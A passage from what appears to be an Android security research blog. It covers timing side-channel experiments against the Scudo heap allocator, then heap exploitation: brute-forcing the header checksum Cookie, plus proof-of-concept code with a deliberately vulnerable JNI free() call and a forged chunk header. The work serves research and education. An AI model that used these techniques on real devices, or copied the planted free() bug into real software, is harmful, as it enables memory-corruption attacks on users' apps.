classid 1 allocations, i.e. malloc(0x10)). For each allocation let x_{i,j} be the measured execution time (so 0 \u0026lt;= i \u0026lt;= 12). Add x_{i,j} to the list X_i. After 0 \u0026lt;= j \u0026lt; num_iterations 13 - chunk allocations, compute the average over each list. Let x_i' be the average of X_i Let k := argmax_{0\u0026lt;=i\u0026lt;=12} x_i' Return k Consider the following visualization: From the diagram we can see that C-\u0026gt;Count = 4. Now, if we start measuring the execution times, i.e. we get x_{0,0} for C-\u0026gt;Count = 4, x_{1,0} for C-\u0026gt;Count = 3 etc. we can see that for C-\u0026gt;Count = 0 x_{4,0} is the biggest value. Therefore, right after allocate returns, the result k = 4 of the above attack corresponds to the index of the biggest value x_{4,0}. Note that the second index is used to perform the 13 allocations multiple times in order to cancel out noise using the mean. Also, assuming that each call to malloc via handleMessage is only triggering this very malloc, i.e. there is no other call to malloc that influences C-\u0026gt;Count, after the attack C-\u0026gt;Count takes the same value it had before performing the attack (because C-\u0026gt;Count is in mod 13 and we run 13 * num_iterations allocations, which is divisible by 13).\nBefore the above attack, it may be beneficial to run a few allocations to ensure that populateFreeList is called. This will result in 13 chunks being available in C-\u0026gt;Chunks and thus C-\u0026gt;Count = 13 right after refill and C-\u0026gt;Count = 12 right after allocate returns.\nThe main problem is that the assumptions are too strong for this attack to work on a real - world app. I.e. there are multiple threads that run malloc(0x10). Therefore, the timings measured from the perspective of a single thread may be influenced by the following:\nThread synchronization in Allocator::allocate . I.e. if there is another thread currently allocating memory via the primary, then our thread is forced to wait until the critical section is unlocked. Between two calls to malloc(0x10), there may be an arbitrary amount of threads that run malloc(0x10) due to scheduling. Therefore, the above attack, which assumes to be able to run 13 consecutive allocations in a row, is unlikely to work. This basically poisons the averages, which makes all of them look almost the same! Remote call to malloc can trigger multiple allocations! Therefore, one measurement might decrease C-\u0026gt;Count by two or more instead of one. Multithreaded Timing - Based Side Channel Attacks on Primary This section describes different approaches that aim to predict C-\u0026gt;Count based on measured timings in a multithreaded environment.\nLearn Distribution from Leaked Counts Let c_i for 0 \u0026lt;= i \u0026lt; n be the leaked values for C-\u0026gt;Count from one thread (with fixed TSD) right before each malloc(0x10). Notice that due to multithreading, this leaked value might differ from the value that is used in the following malloc call. We assume that the probability for this is negligible though.\nThen compute for 0 \u0026lt;= i \u0026lt; n-1 the difference of the C-\u0026gt;Count values, i.e. d_i = -(c_{i+1} - c_{i}) mod 13. With high probability, the d_i represent the amount of malloc(0x10) calls performed by other threads between each pair of malloc(0x10) calls performed by our thread. Remember that the c_i are leaked from our main thread.\nConstruct the probability distribution according to the frequencies of the d_i values. It is expected to be binomially distributed. Then, apply those probabilities to the timings. I.e. between each consecutive pair of time measurements x_i and x_{i+1} there is a random variable D_i distributed according to the above distribution.\nAssuming we have a sequence of values for C-\u0026gt;Count that is unknown, then every element in this unknown sequence can be represented as a random variable. To be precise, letting C_i be the random variables representing the C-\u0026gt;Count before the i-th malloc(0x10):\nC_{i+1} = C_i + D_i = C_i + D // for all i: D_i are iid., so D~freq{d_i} is enough Assuming that there is an anchor point, i.e. there exists a constant value 0 \u0026lt;= C_0 \u0026lt; 13 that is the first value for C-\u0026gt;Count, then\nC_{i+1} = C_i + D = (((C_0 + D) + D) + ... ) + D = C_0 + (i + 1) * D =\u0026gt; E[C_{i+1}] = C_0 + (i+1) * E[D] = C_0 + (i+1) * (1/(n-1) * sum(d_i)) Given a sequence of timings x_i for 0 \u0026lt;= i \u0026lt; m measured by calling malloc(0x10), we could try to identify an anchor point, i.e. a point where refill was triggered by e.g. taking max(x_i). If we get x_k = max(x_i), then we performed k + 1 allocations in order to get to this maximum value. Therefore, we could try to compute E[C_k] to get the expected value for C-\u0026gt;Count, which is based on the above formula.\nUnfortunately, there are some problems with this approach:\nDoes not take into account that other threads still run malloc(0x10) in the background. Although this approach might work for computing the most probable value for C-\u0026gt;Count, it would be invalidated the moment another thread called malloc(0x10). Probabilistic approach\u0026hellip;in practice, this will most likely not be that much better than just guessing the value, because there are only so few possible values C-\u0026gt;Count can take. Learn Thresholds Another approach is to learn thresholds that distinguish a \u0026ldquo;refill - timing\u0026rdquo; from any other timing. Thus we will try to \u0026ldquo;learn\u0026rdquo; a threshold that allows for separating timings into either \u0026ldquo;refill\u0026rdquo; or \u0026ldquo;non - refill\u0026rdquo;. Although this approach might be too \u0026ldquo;simple\u0026rdquo;, because the problem can also be interpreted as distinguishing at least two guassian distributions, we can give it a try.\nInitially, every thread is assigned to a TSD (linked to a cache, i.e. the Chunks array used in e.g. allocate , which is based on the primary) in a round - robin fashion . As experience showed that the app often has at least 20 threads, and NumberOfTSDs is either DefaultTSDCount = 2 or getNumberOfCPUs , which on the test system can at most be 8, we can conclude that there are multiple threads referencing the same TSD. This is still better than having all threads sharing a single TSD!\nAs the UAF module (see previous posts on Use - After - Free) suggests that the current TSD of the JNI thread \u0026ldquo;rarely\u0026rdquo; changes (due to exploitation of the UAF module working almost always), in the following we will assume that we use the same TSD. We will also assume that there either is no other thread that references the current TSD or is at least one such thread, but this thread does not allocate often from the primary with classid 1.\nPerforming only primary allocations of size 0x10, i.e. repeatedly calling a JNI function that calls malloc(0x10), results in the following plot: Further analysis of this plot reveals the following issues:\nThere might exist 3 distinct distributions. I.e. it is possible to almost reliably (i.e. with high probability (whp)) differentiate between three different kinds of timings. This suggests that the types of timings are:\nrefill is called. Expected to be linked to the distribution with the highest mean. popBatch has a batch in the free list popBatch has to call populateFreeList \u0026ndash;\u0026gt; expected to take a lot of time. getTSDAndLock takes longer, i.e. synchronization blocks execution. allocate instantly returns a chunk. Notice that currently, there is NO CERTAIN MAPPING between the first two types of timings and the two distributions with the highest means. However, whp. the distribution with the lowest mean is linked to the event that allocate instantly returns a chunk.\nAssuming the distribution with the smallest mean is linked to the event that allocate instantly returns a chunk and that at least one distribution is caused by multithreading, then with probability at least min(1394 / 4000, 1787 / 4000) = min(0.3485, 0.44675) the TSD is shared with another thread.\nAnother \u0026ldquo;distortion\u0026rdquo; that could appear, but is very improbable, is that crc32 calculation takes very long for specific values. As this has been empirically tested, this can be ruled out for now (I searched for values, which cause long execution times in the crc32 instruction\u0026hellip; without success).\nCalling JNI functions can non - deterministically cause longer execution times e.g. by calling malloc internally.\nIf the amount of points in the two distributions with the highest means are proportional to the total amount of points, then this rules out the possibility that the free list is filled with a lot of batches initially, because there can only be a constant amount of batches initially stored in the free list. Therefore, increasing the amount of allocations will reveal whether the amount of points in both distributions grows with the amount of allocations.\nAlso, notice that our thread will permanently allocate memory via malloc(0x10). If there was another thread that freed memory using free on previously allocated classid - 1 chunks (assuming no memory leaks), then this cannot create a new batch, i.e. result in drain and therefore pushBatch being called, because our thread will not call free at all (of course there might be implicit calls to free, but they would not be part of Scudo). In addition to that, as Java threads have a 1 - 1 mapping with user - level threads (pthread_create), there cannot be multiple threads running handleMessage.\nInterestingly, it turns out that one call to the JNI function may cause multiple internal malloc calls from the same or a TSD - sharing thread. E.g., if each remote malloc resulted in two malloc calls, i.e. one internal call and the call we requested, then, assuming C-\u0026gt;Count \u0026lt; 13, there will be six fast calls and one slow call. The timings used for analysis so far may contain multiple malloc calls, which explains the existence of three distributions. Two of those three distributions are actually the same only with shifted means, one contains the timings with only one malloc, the other one with two calls to malloc. This is due to the fact that handleMessage seems to call malloc at most twice, but at least once. Therefore, the distributions with the smallest and biggest means seem to represent one malloc and two mallocs without refill respectively, whereas the \u0026ldquo;middle\u0026rdquo; distribution seems to represent a single allocation with refill\u0026hellip;although this does not really make sense, because there would have to be a lot of refills\u0026hellip;\nIn order to prove that synchronization is an issue and that one call to handleMessage can cause two malloc calls, consider the following analysis (performed via gdb):\n\u0026lt;Index of handleMessage call\u0026gt;(length = \u0026lt;amount cache allocations per handleMessage\u0026gt;): \u0026lt;Thread ID\u0026gt;: count=\u0026lt;C-\u0026gt;Count value\u0026gt;, id=\u0026lt;Class ID\u0026gt; 0(length = 0): 1(length = 1): 20: count=0xb, id=0x00000020 2(length = 2): 20: count=0xa, id=0x00000020 20: count=0x9, id=0x00000020 3(length = 1): 20: count=0x8, id=0x00000020 4(length = 2): 20: count=0x7, id=0x00000020 20: count=0x6, id=0x00000020 5(length = 0): 6(length = 0): 7(length = 2): 20: count=0x5, id=0x00000020 20: count=0x4, id=0x00000020 8(length = 2): 20: count=0x3, id=0x00000020 20: count=0x2, id=0x00000020 9(length = 1): 20: count=0x1, id=0x00000020 10(length = 1): 20: count=0x0, id=0x00000020 11(length = 1): 20: count=0xc, id=0x00000020 12(length = 1): 20: count=0xb, id=0x00000020 13(length = 0): 14(length = 2): 20: count=0xa, id=0x00000020 20: count=0x9, id=0x00000020 15(length = 0): 16(length = 0): 17(length = 1): 20: count=0x8, id=0x00000020 18(length = 1): 20: count=0x7, id=0x00000020 19(length = 0): 20(length = 2): 20: count=0x6, id=0x00000020 20: count=0x5, id=0x00000020 21(length = 1): 20: count=0x4, id=0x00000020 22(length = 1): 20: count=0x3, id=0x00000020 23(length = 0): 24(length = 1): 20: count=0x2, id=0x00000020 25(length = 1): 20: count=0x1, id=0x00000020 26(length = 0): 27(length = 2): 20: count=0x0, id=0x00000020 20: count=0xc, id=0x00000020 28(length = 1): 20: count=0xb, id=0x00000020 29(length = 1): 20: count=0xa, id=0x00000020 30(length = 0): 31(length = 0): 32(length = 2): 20: count=0x9, id=0x00000020 20: count=0x8, id=0x00000020 33(length = 1): 20: count=0x7, id=0x00000020 34(length = 1): 20: count=0x6, id=0x00000020 35(length = 3): 20: count=0x5, id=0x00000020 5: count=0x5, id=0x00000020 20: count=0x4, id=0x00000020 36(length = 2): 20: count=0x3, id=0x00000020 20: count=0x2, id=0x00000020 37(length = 2): 20: count=0x1, id=0x00000020 20: count=0x0, id=0x00000020 38(length = 2): 20: count=0xc, id=0x00000020 20: count=0xb, id=0x00000020 39(length = 2): 20: count=0xa, id=0x00000020 20: count=0x9, id=0x00000020 40(length = 0): 41(length = 0): 42(length = 1): 20: count=0x8, id=0x00000020 43(length = 1): 20: count=0x7, id=0x00000020 44(length = 2): 20: count=0x6, id=0x00000020 20: count=0x5, id=0x00000020 45(length = 0): 46(length = 0): 47(length = 1): 20: count=0x4, id=0x00000020 48(length = 0): 49(length = 1): 20: count=0x3, id=0x00000020 50(length = 1): 20: count=0x2, id=0x00000020 51(length = 1): 20: count=0x1, id=0x00000020 52(length = 2): 20: count=0x0, id=0x00000020 20: count=0xc, id=0x00000020 53(length = 0): 54(length = 0): 55(length = 0): 56(length = 1): 20: count=0xb, id=0x00000020 57(length = 1): 20: count=0xa, id=0x00000020 58(length = 1): 20: count=0x9, id=0x00000020 59(length = 2): 20: count=0x8, id=0x00000020 20: count=0x7, id=0x00000020 60(length = 0): 61(length = 2): 20: count=0x6, id=0x00000020 20: count=0x5, id=0x00000020 62(length = 0): 63(length = 0): 64(length = 0): 65(length = 0): 66(length = 1): 20: count=0x4, id=0x00000020 67(length = 1): 20: count=0x3, id=0x00000020 68(length = 1): 20: count=0x2, id=0x00000020 69(length = 0): 70(length = 1): 20: count=0x1, id=0x00000020 71(length = 0): 72(length = 1): 20: count=0x0, id=0x00000020 73(length = 1): 20: count=0xc, id=0x00000020 74(length = 1): 20: count=0xb, id=0x00000020 75(length = 1): 20: count=0xa, id=0x00000020 76(length = 2): 20: count=0x9, id=0x00000020 20: count=0x8, id=0x00000020 77(length = 2): 20: count=0x7, id=0x00000020 20: count=0x6, id=0x00000020 78(length = 8): 5: count=0x5, id=0x00000020 5: count=0x4, id=0x00000020 5: count=0x3, id=0x00000020 5: count=0x2, id=0x00000020 5: count=0x2, id=0x00000020 5: count=0x2, id=0x00000020 5: count=0x2, id=0x00000020 20: count=0x4, id=0x00000020 79(length = 3): 5: count=0x4, id=0x00000020 20: count=0x4, id=0x00000020 20: count=0x3, id=0x00000020 80(length = 1): 20: count=0x2, id=0x00000020 81(length = 2): 20: count=0x1, id=0x00000020 20: count=0x0, id=0x00000020 82(length = 1): 20: count=0xc, id=0x00000020 83(length = 2): 20: count=0xb, id=0x00000020 20: count=0xa, id=0x00000020 84(length = 2): 20: count=0x9, id=0x00000020 20: count=0x8, id=0x00000020 85(length = 0): 86(length = 2): 20: count=0x7, id=0x00000020 20: count=0x6, id=0x00000020 87(length = 1): 20: count=0x5, id=0x00000020 88(length = 1): 20: count=0x4, id=0x00000020 89(length = 1): 20: count=0x3, id=0x00000020 90(length = 1): 20: count=0x2, id=0x00000020 91(length = 0): 92(length = 0): 93(length = 1): 20: count=0x1, id=0x00000020 94(length = 2): 20: count=0x0, id=0x00000020 20: count=0xc, id=0x00000020 95(length = 2): 20: count=0xb, id=0x00000020 20: count=0xa, id=0x00000020 96(length = 0): 97(length = 1): 20: count=0x9, id=0x00000020 Thread 20 is the main thread calling handleMessage. Its allocations are interleaved with allocations from thread 5. Notice that there are no inconsistencies in the above measurement, although it seems impossible for count to stay the same. This is due to thread 5 calling free in between calls to malloc.\nTherefore, there is at least one other thread sharing the same TSD as our thread. As execution in gdb is \u0026ldquo;weird\u0026rdquo; sometimes, it can be assumed that multi - threading is even worse if no debugger is present. Overall, with at least one other thread interleaving and with uncertainty whether one call to handleMessage results in one or two calls to malloc, there seems to be no clear path to derive the actual value for C-\u0026gt;Count.\nAnalysing Accurate Measurements Performing timing analysis on the actual device, i.e. in the form of\nclock_gettime(CLOCK_THREAD_CPUTIME_ID, \u0026amp;before); ptr = malloc(size); clock_gettime(CLOCK_THREAD_CPUTIME_ID, \u0026amp;after); elapsed = (after.tv_sec * NS_PER_SECOND + after.tv_nsec) - (before.tv_sec * NS_PER_SECOND + before.tv_nsec); reveals an interesting and quite natural result: Mapping three distributions to the same set of measurements yields: .\nNotice that these measurements are stripped off multiple layers of noise:\nNoise introduced by remote communication Noise introduced by an arbitrary amount of function calls required for e.g. setting up a JNI call. Some synchronization of threads. Notice that measuring the elapsed time for malloc(0x10) directly requires no further data fetching and therefore less threads are involved\u0026hellip; Attacking Secondary Cache Naturally, we could also try to attack the secondary cache via a timing attack. As with classical cache - based side channel attacks, we would expect:\nfast execution time, if entry is in cache, i.e. cache hit slow execution time, if entry is not in cache, i.e. cache miss Unfortunately, my experiments have been shut down by the fact that there is only one secondary for all threads. From experience, damnvulnerableapp:VulnerableActivity uses at least 20 threads. The experiment consisted of two events, i.e. cache hit and cache miss:\ncache hit:\nFor the experiment, we repeat n times:\nAllocate chunk via secondary Free chunk Measure time required in 1. From the second iteration onwards, assuming no other threads steals the freed chunk from the cache, allocations are assumed to be fast. Statistics are taken over 400 measurements (repeated three times):\navg = 351142.4975, var = 6215682405.529994, standard dev = 78839.59922228166; Without first: avg = 350635.6090225564, var = 6128486185.496259, standard dev = 78284.64846632614` avg = 293603.4925, var = 9048178621.879944, standard dev = 95121.91451963078; Without first entry: 292885.1203007519, 8864432314.622118, 94151.11425056061 avg = 343784.9075, var = 8457856232.698944, standard dev = 91966.60389890966; Without first entry: 343308.24812030076, 8388172201.665255, 91586.96523886603 cache miss:\nFor the experiment, we repeat n times:\nAllocate chunk via secondary Measure time required in 1. In the worst case, the first 32 allocations are covered by cache entries. Assuming that no other thread frees a lot of memory that results in chunks, which cover our requests, we end up with the following results (over 400 measurements, repeated twice):\navg = 353609.1975, var = 7648425849.838493, standard dev = 87455.27914219069; Without first 32 entries: 354754.0652173913, 7595866298.691399, 87154.26724315567 avg = 320303.5725, var = 7655033941.299744, standard dev = 87493.05081719201; Without first 32 entries: 320182.16576086957, 7793835282.176328, 88282.70092252687 As can be seen from the repeated experiments, there seems to be no clear way for distinguishing secondary cache hits and misses. This might be due to the fact that there are roughly 20 threads sharing the same 32 cache entries! If we knew the distribution behind some random variable X that represents the amount of secondary allocate calls done in between two allocations performed by our thread, then we might be able to derive a probability distribution on the measured timings and maybe derive the most probable outcome, i.e. either cache hit or miss. But this seems like a rabbit hole, i.e. it does not seem to help in exploiting Scudo.\nConclusion So, what is the result of the above \u0026ldquo;attacks\u0026rdquo; that do not really achieve anything\u0026hellip; Well, I argue that we actually achieved something without knowing that we achieved it, i.e. we can identify whether there are sometimes one and sometimes two calls to malloc when running handleMessage.\nRecall the visualization of the measurements: Of course, the above diagram is composed of measuring only 4000 execution times. Still, we can tell whether a new time measurement belongs to either the red or the blue distribution with high probability, if the assumption is correct that the red and blue distributions represent one and two calls to malloc, respectively! Adding to the pile, being able to distinguish time measurements like shown in the diagram suggests that there is some underlying information to be extracted. Notice that the distributions shown in the diagram come from time measurements taken over a JNI call and not a malloc call directly!\nAs can be seen from the measurements taken locally , Scudo leaks information through execution times and thus is not designed to mitigate timing attacks. Further analyses are required to apply and evaluate the whole potential of side channel attacks on Scudo.\nUnfortunately, I am neither a data scientist nor an expert in statistics or side channel attacks. Hence, the analyses conducted in this blog post are very basic and, again, might be incorrect and/or incomplete.\nTherefore, attacking Scudo in terms of timing attacks has to be postponed until a corresponding expert joins the game.\n","permalink":"https://lolcads.github.io/posts/2024/07/scudo_1/","tags":["Android","Side Channel Attack","Timing Attack","JNI","DamnVulnerableApp","Scudo","Heap Exploitation"],"title":"Timing Attack Experiments against Scudo (Part 2)"},{"categories":null,"content":"Binary Exploitation for Scudo Heap Allocator on Android In this series of blog posts, we will investigate how an attacker may leverage the internals of the Scudo Allocator in order to obtain an advantage on an Android OS. To that end, necessary prerequisites will be discussed and analysed for their likelihood. The focus will primarily be on malloc and free , although realloc and other functions may also be of interest. According to source code , the Scudo version considered in this blog is 161cca266a9d0b6deb5f1fd2de8ad543649a7fa1.\nIf you have no idea about the fundamentals of Scudo, try reading the linked code! The followup blog post discusses timing side channel attacks on Scudo and requires some of the basics discussed in this post.\nNecessary Assumptions Up to this point, no \u0026ldquo;easy\u0026rdquo; way of bypassing the checks in the implementations of malloc and free has been found. Therefore it will be unavoidable to assume that certain events have happened already.\nThe key observation is that every chunk header is protected by a checksum, which is verified for every chunk that is passed to free via Chunk::loadHeader(Cookie, Ptr, \u0026amp;Header) . The computations performed when calculating the checksum are architecture - dependent. Therefore, we assume an Intel architecture, i.e. the checksum computation is based on the crc32 instruction.\nThe checksum depends on\na random 32-bit value named Cookie a pointer to the user data. This pointer is pointing to the memory located right after the chunk header. the header of the chunk. The checksum is computed over the header with a zeroed - out checksum field. Also, as Zygote forks itself when creating a new app, global variables of shared - object files that are already loaded into Zygote will remain constant until Zygote is restarted. A list of loaded shared - object files can be seen below:\n$ readelf -d /proc/$(pidof zygote64)/exe | grep NEEDED 0x0000000000000001 (NEEDED) Shared library: [libandroid_runtime.so] 0x0000000000000001 (NEEDED) Shared library: [libbinder.so] 0x0000000000000001 (NEEDED) Shared library: [libcutils.so] 0x0000000000000001 (NEEDED) Shared library: [libhidlbase.so] 0x0000000000000001 (NEEDED) Shared library: [liblog.so] 0x0000000000000001 (NEEDED) Shared library: [libnativeloader.so] 0x0000000000000001 (NEEDED) Shared library: [libsigchain.so] 0x0000000000000001 (NEEDED) Shared library: [libutils.so] 0x0000000000000001 (NEEDED) Shared library: [libwilhelm.so] 0x0000000000000001 (NEEDED) Shared library: [libc++.so] 0x0000000000000001 (NEEDED) Shared library: [libc.so] 0x0000000000000001 (NEEDED) Shared library: [libm.so] 0x0000000000000001 (NEEDED) Shared library: [libdl.so] $ cat /proc/$(pidof zygote64)/maps | grep libc.so 730eb404b000-730eb408f000 r--p 00000000 07:60 21 /apex/com.android.runtime/lib64/bionic/libc.so 730eb408f000-730eb411d000 r-xp 00043000 07:60 21 /apex/com.android.runtime/lib64/bionic/libc.so 730eb411d000-730eb4122000 r--p 000d0000 07:60 21 /apex/com.android.runtime/lib64/bionic/libc.so 730eb4122000-730eb4123000 rw-p 000d4000 07:60 21 /apex/com.android.runtime/lib64/bionic/libc.so $ readelf -s /apex/com.android.runtime/lib64/bionic/libc.so | grep -e \u0026#34; scudo_malloc\u0026#34; ... 199: 000000000004a0f0 55 FUNC LOCAL DEFAULT 14 scudo_malloc ... Thus, Scudo is implemented in libc.so. Therefore it can be expected that the global variable SCUDO_ALLOCATOR , which is used to implement scudo_malloc and so on, is the same across all apps forked from Zygote. SCUDO_ALLOCATOR is nothing but an instance of scudo::Allocator , which contains the field named Cookie . Hence, the Allocator::Cookie field can be expected to be the same across all apps forked from Zygote.\nSo we need to get the cookie once (per system restart) and we will be able to exploit Scudo/Heap - related vulnerabilities as long as we know necessary pointers. Unless stated otherwise, in the following sections we will always assume that we are given sufficient leaks to compute correct checksums!\nClassical Information Leak Attacks on checksum computation are already out there, e.g. it has been possible to compute the Cookie from a pointer and header leak (the header contains a valid checksum!) by reformulating the checksum computation as a set of SMT equations . Unfortunately, comparing the implementation attacked with the implementation we are facing, we can observe that\nIntel uses a custom generator polynomial to implement crc32 (see Intel Manual Vol. 2). I.e. poly = 0x11EDC6F41 instead of the standardized 0x0104C11DB7 . Checksum computation in our cases applies an additional xor in order to reduce the checksum size. It has not been possible to derive a lookup table for Intel\u0026rsquo;s crc32 implementation. If it had been successful, maybe the SMT attack would have worked. Other attacks involving symbolic execution (via klee based on this have also not been successful\u0026hellip;). Still, there is another approach to go back to: brute - force!\nTurns out that using a multi - threaded application to brute - force the Cookie overshot the goal. E.g., if we are given:\npointer = 0x7bac6974fd30 header = 0x20d2000000010101 brute - forcing the Cookie s.t. computeChecksum(Cookie, pointer, zeroed_header) == checksum(header) is true resulted in roughly 120155 candidates over the course of 3 seconds\u0026hellip; running it for longer of course will yield more results:\n$ head cookies.txt 0x2a7e 0x2000539a 0x6000a052 0x4000d9b6 0x80009213 0xc00061db 0x20014924 0xe000183f 0x130c0 0xa000ebf7 Now one might argue that those cookie values are only valid for the above configuration. The funny thing is that at least some of them work for different configurations as well! This means that the pointer used to brute - force the cookie can be completely different from the pointer of our buffer! Of course neither every single value has been verified, nor is there a formal proof to why most of the above cookies work. Empirically speaking, e.g. 0x2a7e worked for crafting fake chunks etc. therefore bypassing the checksum verifications!\nUnprivileged App Due to the appification, one might argue that it nowadays is easier to execute an app on a targeted mobile device (assuming your average smartphone user) than it has been 10 years ago. Therefore, research regarding side channel attacks on mobile devices (e.g. see \u0026ldquo;An Insight into Android Side-Channel Attacks\u0026rdquo; for a rough overview on this topic) often assume that there is an unprivileged app already running on the targeted device.\nHence we could also assume that we can at least start an app on the target device. Notice that permissions for communication over the internet are normal permissions , i.e. they are specified in the android manifest file of an app and the user is only asked once per installation whether the permissions are fine or not. Therefore we may also assume that an app has almost arbitrary install - time permissions and can leak information via networking.\nAdding to the pile, on Android every app is forked from a process named Zygote64 . Convince yourself that libc.so\ncontains Scudo is loaded by Zygote64 Finally, there is only one instance of the allocator .\nConcluding, every app not only has access to the canary used in every app, but also to the Cookie used in every app. Thus, an unprivileged app can easily leak the cookie, therefore leaving us with almost the same setting as the information leak . The only difference is that we do not have a pointer, which we need to compute the checksum.\nSuitable JNI Code As always, we will consider small example modules for damnvulnerableapp. These will not represent real - world applications, but rather contain obviously vulnerable code like free(attacker_controlled_buffer + 0x10).\nAttack Scenarios on Scudo - related Vulnerabilities From this point onwards, we will try to derive attacks that are applicable to bugs that involve calls to Scudo - related functions like free. These attacks will be of the form Proof of Concept, i.e. e.g. we will already be satisfied, if construction of fake chunks works, instead of achieving arbitrary code execution. The idea here is to get to a comparable point wrt. other heap implementations like dlmalloc .\nFreeing Chunks that are not really Chunks For this section and following subsections we will assume that the target app contains JNI code similar to:\nuint8_t *buffer = malloc(0x10); ... free(buffer + x); // x = 0x10(primary) or 0x40(secondary) ... Disregarding the fact that no programmer would ever call free like this, there are always settings where the attention of a developer slips and comparable bugs occur. Also we could reinterpret this as calling free on an attacker - controlled pointer.\nWhen calling free, internally scudo_free is executed, which will wind up to call deallocate . There are a few checks we need to pass in order to get to the storage parts of chunks of the allocator:\n... // [1] Check alignment of pointer provided to deallocate if (UNLIKELY(!isAligned(reinterpret_cast\u0026lt;uptr\u0026gt;(Ptr), MinAlignment))) reportMisalignedPointer(AllocatorAction::Deallocating, Ptr); ... // [2] Check the checksum of the header. If it is corrupted, the process will be aborted! Chunk::loadHeader(Cookie, Ptr, \u0026amp;Header); // [3] Verify that the chunk is not double - freed if (UNLIKELY(Header.State != Chunk::State::Allocated)) reportInvalidChunkState(AllocatorAction::Deallocating, Ptr); ... // [4] Check that e.g. free is used for malloc\u0026#39;ed memory. if (Options.get(OptionBit::DeallocTypeMismatch)) { if (UNLIKELY(Header.OriginOrWasZeroed != Origin)) { if (Header.OriginOrWasZeroed != Chunk::Origin::Memalign || Origin != Chunk::Origin::Malloc) reportDeallocTypeMismatch(AllocatorAction::Deallocating, Ptr, Header.OriginOrWasZeroed, Origin); } } ... // [5] Check the size of the chunk const uptr Size = getSize(Ptr, \u0026amp;Header); if (DeleteSize \u0026amp;\u0026amp; Options.get(OptionBit::DeleteSizeMismatch)) { if (UNLIKELY(DeleteSize != Size)) reportDeleteSizeMismatch(Ptr, DeleteSize, Size); } // [6] This does the actual freeing quarantineOrDeallocateChunk(Options, TaggedPtr, \u0026amp;Header, Size); From the call to deallocate in scudo_malloc and the function signature of deallocate , we can infer that [5] is not relevant:\nINTERFACE WEAK void SCUDO_PREFIX(free)(void *ptr) { SCUDO_ALLOCATOR.deallocate(ptr, scudo::Chunk::Origin::Malloc); } NOINLINE void deallocate(void *Ptr, Chunk::Origin Origin, uptr DeleteSize = 0, UNUSED uptr Alignment = MinAlignment) {...} as DeleteSize defaults to 0! Therefore, as long as quarantineOrDeallocateChunk does not apply any more checks on the size, the size can be choosen arbitrarily, i.e. to our advantage.\nIn quarantineOrDeallocateChunk , there is a check that determines whether a chunk will be put into quarantine, i.e. its freeing will be hold back to avoid reuse - based attacks. The flag that represents this check is computed as follows:\n... // If the quarantine is disabled, the actual size of a chunk is 0 or larger // than the maximum allowed, we return a chunk directly to the backend. // This purposefully underflows for Size == 0. const bool BypassQuarantine = !Quarantine.getCacheSize() || ((Size - 1) \u0026gt;= QuarantineMaxChunkSize) || !NewHeader.ClassId; ... Notice that the comment states that \u0026ldquo;This purposefully underflows for Size == 0\u0026rdquo;, making BypassQuarantine = true for Size = 0 :) Therefore, even if the quarantine was activated by default (which it is not! Notice that Quarantine.getCacheSize() = thread_local_quarantine_size_kb \u0026lt;\u0026lt; 10, where thread_local_quarantine_size_kb = 0 ), we could bypass the quarantine by size = 0.\nThere are a few more interesting checks for the chunk (in the bypass branch):\nvoid *BlockBegin = getBlockBegin(Ptr, \u0026amp;NewHeader); const uptr ClassId = NewHeader.ClassId; if (LIKELY(ClassId)) { ... TSD-\u0026gt;Cache.deallocate(ClassId, BlockBegin); ... } else { ... Secondary.deallocate(Options, BlockBegin); } ... static inline void *getBlockBegin(const void *Ptr, Chunk::UnpackedHeader *Header) { return reinterpret_cast\u0026lt;void *\u0026gt;( reinterpret_cast\u0026lt;uptr\u0026gt;(Ptr) - Chunk::getHeaderSize() - (static_cast\u0026lt;uptr\u0026gt;(Header-\u0026gt;Offset) \u0026lt;\u0026lt; MinAlignmentLog)); } Observe that we control NewHeader.ClassId and Header-\u0026gt;Offset (maybe Header-\u0026gt;Offset can be used for memory probing ).\nFrom this point onwards, we can distinguish attacks that use the primary or the secondary!\nPrimary Poisoning If we want to get to Cache.deallocate, we will need NewHeader.ClassId \u0026gt; 0 to pass the check.\nInvestigating Cache.deallocate , which is the primary, reveals:\nvoid deallocate(uptr ClassId, void *P) { CHECK_LT(ClassId, NumClasses); PerClass *C = \u0026amp;PerClassArray[ClassId]; ... C-\u0026gt;Chunks[C-\u0026gt;Count++] = Allocator-\u0026gt;compactPtr(ClassId, reinterpret_cast\u0026lt;uptr\u0026gt;(P)); ... } Thus, if we get through all the checks, when Cache.deallocate is called, our fake chunk will be part of the list! One way to verify this is to create a JNI function of the form:\n#define BUFFER_SIZE 0x20 static uint8_t called = 0; static uint8_t *buffer = NULL; JNIEXPORT jbyteArray JNICALL Java_com_damnvulnerableapp_vulnerable_modules_PoCPrimaryPoisoning_free( JNIEnv *env, jobject class, jbyteArray chunk) { // Leaks the pointer of a global buffer on first call. if (!called) { called++; buffer = malloc(BUFFER_SIZE); // enough memory to store full classid 1 chunk jbyteArray ar = (*env)-\u0026gt;NewByteArray(env, 8); jbyte *leak = (jbyte*)\u0026amp;buffer; (*env)-\u0026gt;SetByteArrayRegion(env, ar, 0, 8, leak); return ar; } // Calls free(buffer + 0x10) and tries to avoid heap meta data overflows uint8_t *raw = (uint8_t*)(*env)-\u0026gt;GetByteArrayElements(env, chunk, NULL); uint32_t length = (*env)-\u0026gt;GetArrayLength(env, chunk); if (raw) { memcpy(buffer, raw, (length \u0026lt;= BUFFER_SIZE) ? length : BUFFER_SIZE); // Brings attacker - controlled chunk into primary free(buffer + 0x10); // combined header uint8_t *new = malloc(0x10); jbyteArray output = (*env)-\u0026gt;NewByteArray(env, 0x10); (*env)-\u0026gt;SetByteArrayRegion(env, output, 0, 0x10, new); return output; } return NULL; } Then, an attacker could write the header first, then 8 bytes of padding, followed by e.g. a string \u0026ldquo;Hello World!\u0026rdquo;. Lets see that in action!\nLets say the first call to this function leaked pointer = 0x7bac7976f730 and say we somehow got a cookie from a previous leak or so, Cookie = 0x2a7e. Then we could use the following code to craft the fake header:\ncombined_header = unpacked_header() combined_header.ClassId = 1 # Smallest allocation class --\u0026gt; primary, user_data_size=0x10 combined_header.State = 1 # = Allocated --\u0026gt; cannot free a free chunk combined_header.SizeOrUnusedBytes = 0 # Bypass quarantine (actually irrelevant) combined_header.OriginOrWasZeroed = 0 # = allocated via malloc combined_header.Offset = 0 # chunk_start ~= usr_ptr - header_size - offset combined_header.Checksum = utils.android_crc32( cookie, # 0x2a7e pointer + 0x10, # buffer = 0x7bac7976f730 =\u0026gt; buffer + 0x10 fake user data combined_header.pack() # u64 representation of this header, with checksum=0 ) With the above, the header looks like 0x75a5000000000101 (mind little - endian).\nIf we send 